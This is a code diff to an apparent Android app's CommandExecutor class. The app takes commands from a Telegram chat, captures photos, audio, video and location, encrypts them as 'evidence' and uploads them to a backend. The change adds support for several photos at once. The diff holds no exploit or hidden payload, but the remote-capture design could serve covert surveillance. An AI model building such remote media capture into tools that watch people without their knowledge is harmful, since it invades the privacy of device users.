@@ -149,11 +149,20 @@ class CommandExecutor @Inject constructor(
             // Deliver text response
             sendText(parsed.chatId, result.message)
 
-            // Deliver photo if generated (encrypted into vault & queued in WorkManager)
-            result.photoFile?.let { file ->
+            // Deliver photo(s) if generated (encrypted into vault & queued in WorkManager)
+            val allPhotos = result.photoFiles ?: (result.photoFile?.let { listOf(it) } ?: emptyList())
+            for ((index, file) in allPhotos.withIndex()) {
                 if (file.exists() && file.length() > 0) {
+                    val caption = if (allPhotos.size > 1) {
+                        "🖼️ Photo ${index + 1}/${allPhotos.size}: ${file.name}"
+                    } else {
+                        "📸 Captured photo"
+                    }
                     val (encFile, _) = enqueueAndEncryptEvidence(null, file, "PHOTO")
-                    sendPhoto(parsed.chatId, encFile, "📸 Captured photo")
+                    sendPhoto(parsed.chatId, encFile, caption)
+                    if (index < allPhotos.size - 1) {
+                        kotlinx.coroutines.delay(350L)
+                    }
                 }
             }
 
@@ -268,12 +277,16 @@ class CommandExecutor @Inject constructor(
         return try {
             val result = handler.execute(parsed.args, parsed.chatId)
 
-            var photo = result.photoFile
-            var photoUploadId = ""
-            if (photo != null && photo.exists() && photo.length() > 0) {
-                val p = enqueueAndEncryptEvidence(commandId, photo, "PHOTO")
-                photo = p.first
-                photoUploadId = p.second
+            val allPhotos = result.photoFiles ?: (result.photoFile?.let { listOf(it) } ?: emptyList())
+            val processedPhotos = mutableListOf<File>()
+            val photoUploadIds = mutableListOf<String>()
+
+            for (p in allPhotos) {
+                if (p.exists() && p.length() > 0) {
+                    val enc = enqueueAndEncryptEvidence(commandId, p, "PHOTO")
+                    processedPhotos.add(enc.first)
+                    if (enc.second.isNotBlank()) photoUploadIds.add(enc.second)
+                }
             }
 
             var audio = result.audioFile
@@ -295,25 +308,32 @@ class CommandExecutor @Inject constructor(
             val delivered = sendResponseToBackend(
                 commandId = commandId,
                 message = result.message,
-                photoFile = photo,
+                photoFile = processedPhotos.firstOrNull(),
+                photoFiles = processedPhotos,
                 audioFile = audio,
                 videoFile = video,
                 location = result.location
             )
 
             if (delivered) {
-                listOf(photoUploadId, audioUploadId, videoUploadId).filter { it.isNotBlank() }.forEach { upId ->
+                (photoUploadIds + listOf(audioUploadId, videoUploadId)).filter { it.isNotBlank() }.forEach { upId ->
                     pendingUploadDao.getById(upId)?.let { u ->
                         pendingUploadDao.update(u.copy(status = "COMPLETED", completedAt = System.currentTimeMillis()))
                     }
                 }
-                try { photo?.delete() } catch (_: Exception) {}
+                for (p in processedPhotos) {
+                    try { p.delete() } catch (_: Exception) {}
+                }
                 try { audio?.delete() } catch (_: Exception) {}
                 try { video?.delete() } catch (_: Exception) {}
             } else {
                 // Direct fallback to Telegram
                 sendText(parsed.chatId, result.message)
-                photo?.let { sendPhoto(parsed.chatId, it, "📸 Captured photo") }
+                for ((index, p) in processedPhotos.withIndex()) {
+                    val caption = if (processedPhotos.size > 1) "🖼️ Photo ${index + 1}/${processedPhotos.size}" else "📸 Captured photo"
+                    sendPhoto(parsed.chatId, p, caption)
+                    if (index < processedPhotos.size - 1) kotlinx.coroutines.delay(350L)
+                }
                 audio?.let { sendAudio(parsed.chatId, it, "🎙️ Audio recording") }
                 video?.let { sendVideo(parsed.chatId, it, "🎥 Captured video") }
                 result.documentFile?.let { sendDocument(parsed.chatId, it, "📄 ${it.name}") }
@@ -340,6 +360,7 @@ class CommandExecutor @Inject constructor(
         commandId: String?,
         message: String,
         photoFile: File? = null,
+        photoFiles: List<File>? = null,
         audioFile: File? = null,
         videoFile: File? = null,
         location: Pair<Double, Double>? = null
@@ -350,13 +371,14 @@ class CommandExecutor @Inject constructor(
             val cmdIdBody = commandId?.toRequestBody("text/plain".toMediaTypeOrNull())
             val msgBody = message.toRequestBody("text/plain".toMediaTypeOrNull())
 
-            val photoPart = photoFile?.let {
-                if (it.exists() && it.length() > 0) {
-                    val reqFile = if (encryptionManager.isEncryptedVaultFile(it)) {
+            val targetPhotos = photoFiles ?: (photoFile?.let { listOf(it) } ?: emptyList())
+            val photoParts = targetPhotos.mapIndexedNotNull { index, f ->
+                if (f.exists() && f.length() > 0) {
+                    val reqFile = if (encryptionManager.isEncryptedVaultFile(f)) {
                         object : okhttp3.RequestBody() {
                             override fun contentType() = "image/jpeg".toMediaTypeOrNull()
                             override fun writeTo(sink: okio.BufferedSink) {
-                                encryptionManager.decryptEvidenceVaultToStream(it).use { input ->
+                                encryptionManager.decryptEvidenceVaultToStream(f).use { input ->
                                     val buffer = ByteArray(8192)
                                     var read: Int
                                     while (input.read(buffer).also { read = it } != -1) {
@@ -366,11 +388,15 @@ class CommandExecutor @Inject constructor(
                             }
                         }
                     } else {
-                        it.asRequestBody("image/jpeg".toMediaTypeOrNull())
+                        f.asRequestBody("image/jpeg".toMediaTypeOrNull())
                     }
-                    MultipartBody.Part.createFormData("photo", "photo.jpg", reqFile)
+                    val fileName = if (f.name.endsWith(".enc")) "photo_${index}.jpg" else f.name
+                    MultipartBody.Part.createFormData("photo", fileName, reqFile)
                 } else null
             }
+
+            val singlePhotoPart = if (photoParts.size == 1) photoParts.first() else null
+            val multiPhotoParts = if (photoParts.size > 1) photoParts else null
 
             val audioPart = audioFile?.let {
                 if (it.exists() && it.length() > 0) {
@@ -423,7 +449,8 @@ class CommandExecutor @Inject constructor(
                 deviceId = deviceIdBody,
                 commandId = cmdIdBody,
                 message = msgBody,
-                photo = photoPart,
+                photo = singlePhotoPart,
+                photos = multiPhotoParts,
                 audio = audioPart,
                 video = videoPart,
                 evidence = null,
